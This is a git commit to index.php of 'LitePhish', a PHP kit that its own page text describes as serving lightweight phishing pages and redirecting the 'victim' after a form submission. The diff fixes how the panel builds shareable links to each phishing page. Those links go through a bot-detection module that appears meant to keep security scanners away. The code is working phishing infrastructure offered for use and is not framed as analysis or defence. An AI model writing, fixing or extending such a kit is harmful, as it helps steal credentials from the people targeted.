800a1d579d2fea1714a949889b6e5c663ed0ffd8
Gray Programmerz <hackrefisher@gmail.com>
2021-01-10 14:29:04 +0500

    [Fixed] wrong link shown on textarea
    wrong link shown on textarea when current url ends with index.php

--- index.php
+++ index.php
@@ -4,7 +4,7 @@ echo '
 <link rel="stylesheet" href="modules/style.css">
 <center>	
 <title>LitePhish</title>
-<a style=font-size:20px href=>LitePhish - written from scratch</a><br>
+<a style="font-size:20px" href=>LitePhish - written from scratch</a><br>
 <p><a href=http://github.com/DarkSecDevelopers/LitePhish target=_blank>LitePhish</a> provides lite weight phishing pages with clean and minimal interface. <br>
 It is modified and lite version of <a href=http://www.github.com/graysuit/grayfish target=_blank>grayfish</a>.
 When victim submit form, <br>he/she would be redirected towards the url you specified in input below.<br>
@@ -15,14 +15,15 @@ You can also click on the page name to check the link.
 <input oninput=UpdateRedirects(this.id) placeholder="Redirect victim to ? http://example.com" id="redirect">
 <br><br><br>';
 
-$Current_Url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";  //https://stackoverflow.com/a/6768831/11390822
+$Current_Url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on" ? "https://" : "http://").$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']); //https://stackoverflow.com/a/64450973/11390822
 $SiteIndex = 1;
+
 foreach(scandir('./websites') as $file) 
 {
 	if (!is_dir('./websites/'.$file)) 
 	{
-		echo "<a target=_blank href='./modules/detect_bot.php?filename=$file'>".$SiteIndex.") ".$file."</a><br>";
-		echo "<textarea onclick='Copy(this.id);' id='textarea_$file'>".$Current_Url."./modules/detect_bot.php?filename=".$file."</textarea>";
+		echo "<a target=_blank href='".$Current_Url."/modules/detect_bot.php?filename=$file'>".$SiteIndex.") ".$file."</a><br>";
+		echo "<textarea onclick='Copy(this.id);' id='textarea_$file'>".$Current_Url."/modules/detect_bot.php?filename=".$file."</textarea>";
 		echo "<br><br><br>";
 		$SiteIndex += 1;
 	}
